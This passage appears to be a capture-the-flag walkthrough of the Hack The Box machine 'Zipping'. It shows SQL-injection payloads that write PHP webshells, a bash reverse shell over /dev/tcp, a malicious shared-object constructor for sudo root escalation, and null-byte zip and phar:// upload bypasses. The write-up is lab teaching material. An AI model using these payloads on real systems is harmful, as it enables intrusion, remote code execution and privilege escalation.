> - Enables reading and writing files on the server host using the [`LOAD DATA`](https://dev.mysql.com/doc/refman/8.0/en/load-data.html) and [`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statements and the [`LOAD_FILE()`](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) function. A user who has the [`FILE`](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file) privilege can read any file on the server host that is either world-readable or readable by the MySQL server. (This implies the user can read any file in any database directory, because the server can access any of those files.)
> - Enables creating new files in any directory where the MySQL server has write access. This includes the server’s data directory containing the files that implement the privilege tables.
> - Enables use of the `DATA DIRECTORY` or `INDEX DIRECTORY` table option for the [`CREATE TABLE`](https://dev.mysql.com/doc/refman/8.0/en/create-table.html) statement.

#### PHP POC

I want a PHP webshell. As a quick test, I’ll write a quick PHP file into `/dev/shm` with:

```
id=%0A100'+union+select+"<?php+phpinfo();+?>",2,3,4,5,6,7,8+into+outfile+"/dev/shm/0xdf.php";--+-1

```

It returns “Product does not exist!”, which means it worked. If I try to write to the same file again, it will return an empty page, which indicates failure. It doesn’t want to overwrite existing files.

I’ll now load that using the LFI identified [above](#analysis) with `http://10.10.11.229/shop/index.php?page=/dev/shm/0xdf`:

[![image-20240110110422182](https://0xdf.gitlab.io/img/image-20240110110422182.png)](https://0xdf.gitlab.io/img/image-20240110110422182.png)

That’s executing my PHP to show the info. That’s code execution.

It’s worth nothing that while this works in `/dev/shm`, it won’t work in `/tmp`, because Apache’s using a sandboxed `tmp` directory, `SYSTEMD_PRIVATE`. .

#### Webshell / Shell

To get a webshell, I’ll change the injection to write a webshell:

```
id=%0A100'+union+select+"<?php+system($_REQUEST['cmd']);+?>",2,3,4,5,6,7,8+into+outfile+"/dev/shm/shell.php";--+-1

```

Now to execute it I’ll just visit it with `cmd=id`:

![image-20240110111010789](https://0xdf.gitlab.io/img/image-20240110111010789.png)

To turn that into a shell, I’ll start `nc` and update the `cmd` to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```
cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

```

It is important to encode the `&` to `%26` so that it’s not treated as the end of the parameter and start of another.

At `nc`, I get a shell:

```
oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.229 49150
bash: cannot set terminal process group (1155): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$

```

I’ll upgrade using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
rektsu@zipping:/var/www/html/shop$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
rektsu@zipping:/var/www/html/shop$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
rektsu@zipping:/var/www/html/shop$

```

And grab `user.txt` if I hadn’t already [above](#manual):

```
rektsu@zipping:/home/rektsu$ cat user.txt
ea9a4d59************************

```

## Shell as root

### Enumeration

#### sudo

rektsu can run the `stock` binary as root on Zipping:

```
rektsu@zipping:/home/rektsu$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock

```

#### stock

Basic enumeration of this binary shows that it asks for a password:

```
rektsu@zipping:/home/rektsu$ stock
Enter the password: test
Invalid password, please try again.

```

Running as root doesn’t change this:

```
rektsu@zipping:/home/rektsu$ sudo stock
Enter the password: im root
Invalid password, please try again.

```

#### Recover Password

Running `strings` on the binary dumps a bunch that provides hints as to this binaries purpose, but also a string that looks like a potential password just before the string “Enter the password:”:

![image-20240110112324756](https://0xdf.gitlab.io/img/image-20240110112324756.png)

Entering that works:

```
rektsu@zipping:/home/rektsu$ sudo stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option:

```

#### Identify Library Load Issue

Before running strings, I tried to run `ltrace` on the box to see if it would show the `strcmp`, but `ltrace` isn’t on Zipping. `strace` is, but doesn’t show the comparison:

```
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, 0xdf
"0xdf\n", 1024)                 = 5
write(1, "Invalid password, please try aga"..., 36Invalid password, please try again.
) = 36
exit_group(1)                           = ?
+++ exited with 1 +++

```

There I enter “0xdf” and see the `write` call showing it failed.

If I try `strace` with the correct password, I’ll notice something interesting just after:

```
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
write(1, "\n================== Menu ======="..., 44
================== Menu ==================
) = 44
write(1, "\n", 1
)                       = 1
write(1, "1) See the stock\n", 171) See the stock
)      = 17
write(1, "2) Edit the stock\n", 182) Edit the stock
)     = 18
write(1, "3) Exit the program\n", 203) Exit the program
)   = 20
write(1, "\n", 1
)                       = 1
write(1, "Select an option: ", 18Select an option: )      = 18
read(0,

```

Before it prints the menu, it attempts to load `/home/rektsu/.config/libcounter.so`, but fails because that file doesn’t exist.

### Malicious SO

If I can create a malicious shared object (library) in that location, it will be loaded by the binary. Any code I put into a constructor will be executed. I’ve shown this before, most recently with [Broker](https://0xdf.gitlab.io/2023/11/09/htb-broker.html#create-so).

I’ll write a simple C file:

```
rektsu@zipping:/home/rektsu/.config$ cat libcounter.c
#include <stdlib.h>
__attribute__ ((__constructor__))
void shell(void){
    system("/bin/bash");
}

```

It marks the `shell` function as a constructor, which means it runs when the library is loaded. That function simply calls `/bin/bash`, interrupting the flow of the program and returning an interactive shell.

I’ll compile this as a shared object:

```
rektsu@zipping:/home/rektsu/.config$ gcc -shared -o libcounter.so -fPIC libcounter.c
rektsu@zipping:/home/rektsu/.config$ ls
libcounter.c  libcounter.so

```

Now when I run `sudo stock`, after putting in the password, it drops into `bash` as root:

```
rektsu@zipping:/home/rektsu/.config$ sudo stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu/.config# id
uid=0(root) gid=0(root) groups=0(root)

```

And I’m able to read the flag:

```
root@zipping:~# cat root.txt
b29a08c2************************

```

### Background

Both these technique allows for skipping the `/shop` pages and SQL injection entirely, focusing rather on how files are uploaded to Zipping and abusing clever ways to bypass the LFI restrictions:

```
flowchart TD;
    A[File Read via Upload]-->B(Source Analysis);
    B-->F(Null Byte Zips);
    F-->E;
    B-->C(SQLI);
    C-->D(File Write);
    D-->E[Webshell];
    B-->G(PHAR);
    G-->E;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,6,7 stroke-width:2px,stroke:#4B9CD3,fill:none;

```

### Via Null Bytes

#### Background

This unintended solution has to do with how null bytes in filenames inside zip files are handled, specifically that there’s a difference between how `7z` and PHP handle them. IppSec tipped me off to this, and we had a good time digging into it to figure out exactly how it works.

It seems HTB patched an issue like this on 7 September 2023, two weeks after its release:

![image-20240110165238344](https://0xdf.gitlab.io/img/image-20240110165238344.png)

I don’t know what that patch did, but this is still exploitable today.

#### Creating Zip

Creating a zip archive with a null in the filename of a file inside it is tricky. I don’t know a good way to do it with `zip`. Python doesn’t let me write a file with a null byte in the filename:

```
>>> with open('test\x00.pdf', 'w') as f:
...   f.write("this is a test file")
...
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: embedded null byte

```

Python will create a Zip when given a null in the filename:

```
>>> import zipfile
>>> with zipfile.ZipFile("example.zip", "w") as zip_file:
...     zip_file.writestr("test.php\x00.pdf", "this is a test")
...

```

However, if I look at a hex dump of the resulting file, the `\x00.pdf` is gone:

![image-20240110123240105](https://0xdf.gitlab.io/img/image-20240110123240105.png)

Instead, I’ll write one with two dots, the first acting as a placeholder:

```
>>> with zipfile.ZipFile("nulls.zip", "w") as zip_file:
...     zip_file.writestr("0xdf.php..pdf", "<?php system($_REQUEST['cmd']); ?>")
...

```

Now I’ll open `nulls.zip` in a hex editor find the references to the filename:

![image-20240110123544736](https://0xdf.gitlab.io/img/image-20240110123544736.png)

Changing the first one will break `7z`, which is important because that’s what Zipping uses. I’ll just change the first null in the second filename:

![image-20240110123955810](https://0xdf.gitlab.io/img/image-20240110123955810.png)

#### Handling Nulls 7z/zip vs PHP

Once I’ve edited the null into the second filename instance inside the zip, `unzip` and `7z` both show it as just `0xdf.php`, stopping at the null:

```
oxdf@hacky$ unzip -l nulls.zip
Archive:  nulls.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       34  2024-01-10 12:34   0xdf.php
---------                     -------
       34                     1 file
oxdf@hacky$ 7z l nulls.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 158 bytes (1 KiB)

Listing archive: nulls.zip

--
Path = nulls.zip
Type = zip
Physical Size = 158

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-01-10 12:34:00 .....           34           34  0xdf.php
------------------- ----- ------------ ------------  ------------------------
2024-01-10 12:34:00                 34           34  1 files

```

Turning to PHP, to be able to work with Zip archives, I’ll need to install `apt install php-zip`. With that, I’ll drop to a PHP shell and open `nulls.zip`:

```
oxdf@hacky$ php -a
Interactive shell

php > $zip = new ZipArchive;
php > echo $zip->open('nulls.zip');
1

```

It has one file:

```
php > echo $zip->count();
1

```

And the name includes the null:

```
php > echo $zip->getNameIndex(0);
0xdf.php .pdf

```

#### Zippping Source Analysis

With that background, I’ll look at the code on Zipping that handles the uploaded zip archive. It starts by getting a hash, using it to make an uploads path, and getting the temp directory location:

```
    // Create an md5 hash of the zip file
    $fileHash = md5_file($zipFile);
    // Create a new directory for the extracted files
    $uploadDir = "uploads/$fileHash/";
    $tmpDir = sys_get_temp_dir();

```

`sys_get_temp_dir()` just returns `/tmp`, or sometimes `/var/tmp`:

```
php > echo sys_get_temp_dir();
/tmp

```

On Zipping it’s `/tmp` as well.

Then it opens the given archive, makes sure there’s exactly one file, and gets the filename:

```
    // Extract the files from the zip
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === true) {
      if ($zip->count() > 1) {
        echo '<p>Please include a single PDF file in the archive.<p>';
      } else {
      // Get the name of the compressed file
        $fileName = $zip->getNameIndex(0);

```

It then checks that the name ends with `.pdf`, and if so, it uses `7z` to extract the file into the `$uploadPath`:

```
      if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
        $uploadPath = $tmpDir.'/'.$uploadDir;
        echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
        if (file_exists($uploadPath.$fileName)) {
          mkdir($uploadDir);
          rename($uploadPath.$fileName, $uploadDir.$fileName);
        }

```

If the file then exists, it moves to to `$uploadDir`, which is in the web directory.

#### Exploit Zipping

So what happens with the null byte in the name on Zipping? It will get the zip and when it gets the filename, it gets the full name, `0xdf.php\x00.pdf`. It checks that the file has a `.pdf` extension, which it does. It then uses `7z` to extract, creating the file `/tmp/uploads/[hash]/0xdf.php`.

Then PHP checks if the file exists, and it doesn’t, as it’s looking for `/tmp/uploads/[hash]/0xdf.php\x00.pdf`. So it doesn’t move the directory to the web, and it continues (sending back a success message with the path that doesn’t exist).

If I upload `nulls.zip` via the webpage, it returns a link:

![image-20240110125801352](https://0xdf.gitlab.io/img/image-20240110125801352.png)

Clicking it returns a 404:

![image-20240110125820253](https://0xdf.gitlab.io/img/image-20240110125820253.png)

If I use the LFI to include that page, it gives code execution:

![image-20240110130019435](https://0xdf.gitlab.io/img/image-20240110130019435.png)

### Via Phar Filter

#### Background

PHP has this concept of PHAR (short for PHP Archive) files. They are kind of like what JAR files are for Java, a single file that contains an entire application. They can be referenced by using the `phar://` filter, like this: `phar://path/to/archive.phar/file_in_archive`.

There are complex ways to create a PHAR file, with a lot of good detail in [this blog post](https://reintech.io/blog/beginners-guide-php-phar-library-packaging-distribution). But they can also just be Zip files.

#### file\_exists

I said [earlier](#analysis) that this LFI was harder to exploit because of the `file_exists` call. What’s useful about the `phar://` wrapper here is that it passes the `file_exists` call if the file inside it exists.

To demonstrate, I’ll create a simple text file in a zip:

```
oxdf@hacky$ echo "this is a test" > test.txt
oxdf@hacky$ zip test.zip test.txt
  adding: test.txt (stored 0%)

```

Now from PHP, I can access that file inside the archive:

```
oxdf@hacky$ php -a
Interactive shell

php > echo file_get_contents('phar://test.zip/test.txt');
this is a test

```

And it returns true for `file_exists`:

```
php > if (file_exists('phar://test.zip/test.txt')) { echo "exists"; }
exists

```

It also doesn’t matter what the extension is. If I rename `test.zip` to `test.pdf`:

```
oxdf@hacky$ cp test.zip test.pdf

```

It still works the same:

```
php > echo file_get_contents('phar://test.pdf/test.txt');
this is a test
php > if (file_exists('phar://test.pdf/test.txt')) { echo "exists"; }
exists

```

#### Exploit Zipping

I’ll create a simple webshell, `shell.php`:

```
<?php system($_REQUEST['cmd']); ?>

```

I’ll zip it into a file called `shell.pdf`:

```
oxdf@hacky$ zip shell.pdf shell.php
  adding: shell.php (stored 0%)
oxdf@hacky$ unzip -l shell.pdf
Archive:  shell.pdf
  Length      Date    Time    Name
---------  ---------- -----   ----
       35  2024-01-11 14:26   shell.php
---------                     -------
       35                     1 file

```

I’ll put that into a zip archive called `shell.zip`:

```
oxdf@hacky$ zip shell.zip shell.pdf
  adding: shell.pdf (deflated 34%)
oxdf@hacky$ unzip -l shell.zip
Archive:  shell.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      203  2024-01-11 14:26   shell.pdf
---------                     -------
      203                     1 file

```

Now when I upload that zip, Zipping will unzip `shell.pdf` and return me the link to it:

![image-20240111142822352](https://0xdf.gitlab.io/img/image-20240111142822352.png)

I know that file is at `/var/www/html/uploads/ea409d50349a8436fe49f7ec66aa6132/shell.pdf`, so I can visit:

```
http://10.10.11.229/shop/index.php?page=phar:///var/www/html/uploads/ea409d50349a8436fe49f7ec66aa6132/shell.pdf/shell&cmd=id

```

And it runs the given command, `id`:

```
oxdf@hacky$ curl 'http://10.10.11.229/shop/index.php?page=phar:///var/www/html/uploads/ea409d50349a8436fe49f7ec66aa6132/shell.pdf/shell&cmd=id'
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)

```

That’s a super cool trick!





